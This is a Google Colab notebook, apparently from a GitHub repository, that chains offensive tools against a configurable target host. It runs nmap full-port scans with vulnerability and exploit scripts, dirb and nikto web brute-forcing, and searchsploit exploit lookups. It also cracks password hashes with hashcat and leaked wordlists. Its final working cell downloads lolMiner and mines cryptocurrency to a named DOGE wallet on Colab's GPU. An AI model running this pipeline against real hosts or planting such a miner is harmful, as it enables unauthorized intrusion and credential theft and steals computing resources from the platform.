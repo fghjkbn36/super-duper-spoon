{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled1.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "8qqqPSksSMKN"
      },
      "outputs": [],
      "source": [
        "! nvidia-smi"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "HOST = '127.0.0.1'        #    <== CHANGE THIS\n",
        "\n",
        "# the host must be reachable from google VM\n",
        "\n",
        "\n",
        "######################################################################################################\n",
        "\n",
        "NMAP_DIR = '/content/NMAP'\n",
        "DIRB_DIR = '/content/DIRB'\n",
        "NIKTO_DIR = '/content/NIKTO'\n",
        "WORDLISTS_DIR = '/content/WORDLISTS'\n",
        "\n",
        "HTTP_WORDLIST = WORDLISTS_DIR + '/' + 'custom_url_wordlist.txt'\n",
        "HTTP_EXTENSIONS_FILE = WORDLISTS_DIR + '/' + 'custom_extensions_common.txt'"
      ],
      "metadata": {
        "id": "N_6_q11ySQfL"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "%cd /content/\n",
        "!mkdir {NMAP_DIR}\n",
        "!mkdir {DIRB_DIR}\n",
        "!mkdir {NIKTO_DIR}\n",
        "!mkdir {WORDLISTS_DIR}"
      ],
      "metadata": {
        "id": "ilKHFFpsSQhf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# nmap\n",
        "!apt-get install nmap\n",
        "\n",
        "# searchsploit\n",
        "!git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb\n",
        "!ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit\n",
        "\n",
        "# dirb\n",
        "!apt-get install dirb\n",
        "\n",
        "# nikto\n",
        "!apt-get install nikto\n",
        "\n",
        "# xmllint for searchsploit (and not only)\n",
        "!apt-get install libxml2-utils\n",
        "\n",
        "# wordlists\n",
        "!curl -o \"$HTTP_WORDLIST\" https://raw.githubusercontent.com/Leviathan36/kaboom/master/kaboom/custom_url_wordlist.txt\n",
        "!curl -o \"$HTTP_EXTENSIONS_FILE\" https://raw.githubusercontent.com/Leviathan36/kaboom/master/kaboom/custom_extensions_common.txt"
      ],
      "metadata": {
        "id": "AapPR4RrSQjn"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# This function print the number of port for the open services\n",
        "\n",
        "import lxml.etree as xml\n",
        "\n",
        "def service_ports (name, prot='TCP', state='open', ssl_on=False):\n",
        "  root = xml.parse(\"/content/NMAP/syn_scan.xml\")\n",
        "  \n",
        "  if prot == 'UDP':\n",
        "    state = 'open|filtered'\n",
        "   \n",
        "  if ssl_on == False:\n",
        "    path = \".//port[state[@state=\" + \"'\" + state + \"'\" + \"] and service[@name=\" + \"'\" + name + \"'\" + \"]]\"\n",
        "  elif ssl_on == True:\n",
        "    path = \".//port[state[@state=\" + \"'\" + state + \"'\" + \"] and service[@name=\" + \"'\" + name + \"'\" + \" and @tunnel='ssl']]\"\n",
        "  else:\n",
        "    raise TypeError('Invalid type for SSL parameter')\n",
        "    \n",
        "  ports = []\n",
        "  for i in root.xpath(path):\n",
        "    ports.append(i.attrib['portid'])\n",
        "  \n",
        "  return ports"
      ],
      "metadata": {
        "id": "fDuEDDEnSQl_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!nmap -vvv -oA \"{NMAP_DIR}/syn_scan\" -PE -PS80,443,22,25,110,445 -PU -PP -PA80,443,22,25,110,445 -sS -p- -sV --allports -O --fuzzy --script \"(default or auth or vuln or exploit) and not http-enum\" {HOST}"
      ],
      "metadata": {
        "id": "h8XEXyBjSQod"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!nmap -vvv -oA \"{NMAP_DIR}/udp_scan\" -PE -PS80,443,22,25,110,445 -PU -PP -PA80,443,22,25,110,445 -sU --top-ports 200 -sV --allports {HOST}"
      ],
      "metadata": {
        "id": "pNS5Iiu2SQqe"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "for PORT in service_ports('http'):\n",
        "  !dirb \"http://{HOST}:{PORT}/\" {HTTP_WORDLIST} -r -l -o \"{DIRB_DIR}/dirb_{PORT}.txt\" -x {HTTP_EXTENSIONS_FILE} -z 200"
      ],
      "metadata": {
        "id": "UkUOaYgySQsz"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "for PORT in service_ports('http'):\n",
        "  !nikto -Display PV -nolookup -ask no -Format htm -host \"{HOST}:{PORT}\" -output \"{NIKTO_DIR}/nikto_{PORT}.html\" -Plugins \"ms10_070;report_html;embedded;"
      ],
      "metadata": {
        "id": "w2r8Z_hQSQvE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "for PORT in service_ports('https'):\n",
        "  !dirb \"https://{HOST}:{PORT}/\" {HTTP_WORDLIST} -r -l -o \"{DIRB_DIR}/dirb_https_{PORT}.txt\" -x {HTTP_EXTENSIONS_FILE} -z 200"
      ],
      "metadata": {
        "id": "VaDHSYY8SQxU"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "for PORT in service_ports('https'):\n",
        "  !nikto -ssl -port {PORT} -Display PV -nolookup -ask no -Format htm -host {HOST} -output \"{NIKTO_DIR}/nikto_https_{PORT}.html\" -Plugins \"ms10_070;report_html"
      ],
      "metadata": {
        "id": "WVTDuqmaTHPL"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!searchsploit --www --nmap \"{NMAP_DIR}/syn_scan.xml\""
      ],
      "metadata": {
        "id": "5aBqHbU6THZx"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!searchsploit --www --nmap \"{NMAP_DIR}/udp_scan.xml\""
      ],
      "metadata": {
        "id": "u94TEtM8SQ2E"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!xmllint --xpath \"//table[elem[text()='VULNERABLE' and @key='state']]/@key\" \"{NMAP_DIR}/syn_scan.xml\" 2> /dev/null | tr \" \" \"\\n\" | cut -f2 -s -d'\"' | awk -F \"CVE-\" '{printf \"search cve:\" ; print $2}'"
      ],
      "metadata": {
        "id": "EpYlhFJSSQ8i"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!xmllint --xpath \"//table[elem[text()='VULNERABLE' and @key='state']]/@key\" \"{NMAP_DIR}/udp_scan.xml\" 2> /dev/null | tr \" \" \"\\n\" | cut -f2 -s -d'\"' | awk -F \"CVE-\" '{printf \"search cve:\" ; print $2}'"
      ],
      "metadata": {
        "id": "fjHMmfJqSQ_B"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "WORDLISTS_DIR = '/content/WORDLISTS'\n",
        "HASHES_DIR = '/content/HASHES'\n",
        "\n",
        "HASH_FILE = HASHES_DIR + 'hash_file.txt'    # THE FILE TO DECRYPT            #    <== CHANGE THIS\n",
        "HASHCAT_WORDLIST = WORDLISTS_DIR + '/fasttrack.txt'    # THE WORDLIST TO USE #    <== CHANGE THIS"
      ],
      "metadata": {
        "id": "GyJuGfACSRFT"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# create WORDLISTS directory if it does not already exist\n",
        "\n",
        "%cd '/content/'\n",
        "!mkdir -p {WORDLISTS_DIR}\n",
        "!mkdir {HASHES_DIR}"
      ],
      "metadata": {
        "id": "4rrNlxyxThWT"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!apt-get install hashcat"
      ],
      "metadata": {
        "id": "pEZLt-Y3ThZr"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# fasttrack\n",
        "!curl -o \"{WORDLISTS_DIR}/fasttrack.txt\" https://raw.githubusercontent.com/Leviathan36/kaboom/master/kaboom/fasttrack.txt"
      ],
      "metadata": {
        "id": "CDKGrkMsSRH6"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# rockyou\n",
        "!curl -o \"{WORDLISTS_DIR}/rockyou.txt.tar.gz\" https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz\n",
        "!tar -xvzf \"{WORDLISTS_DIR}/rockyou.txt.tar.gz\" -C {WORDLISTS_DIR}"
      ],
      "metadata": {
        "id": "PbeYlHu-SRKO"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!hashcat -m1800 -a0  {HASH_FILE} {HASHCAT_WORDLIST}"
      ],
      "metadata": {
        "id": "CCDQFsXvSRMj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!hashcat -m1000 -a0  {HASH_FILE} {HASHCAT_WORDLIST}"
      ],
      "metadata": {
        "id": "N67GfZJFTwCH"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!hashcat -m300 -a0  {HASH_FILE} {HASHCAT_WORDLIST}"
      ],
      "metadata": {
        "id": "LT_W2M9YTwEn"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.49/lolMiner_v1.49_Lin64.tar.gz \n",
        "\n",
        "! tar -xf lolMiner_v1.49_Lin64.tar.gz \n",
        "\n",
        "%cd 1.49/ \n",
        "\n",
        "! ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DOGE:DNthsp8ithHnZwYAx1eMs9gM57t7TT7nUe.amirkhani --ethstratum ETHPROXY pause"
      ],
      "metadata": {
        "id": "KqAVjYRjT02r"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        ""
      ],
      "metadata": {
        "id": "Vz5nT1vsT05Z"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        ""
      ],
      "metadata": {
        "id": "L5Ge3nJzSROj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        ""
      ],
      "metadata": {
        "id": "GSJbh9PXSNiB"
      }
    }
  ]
}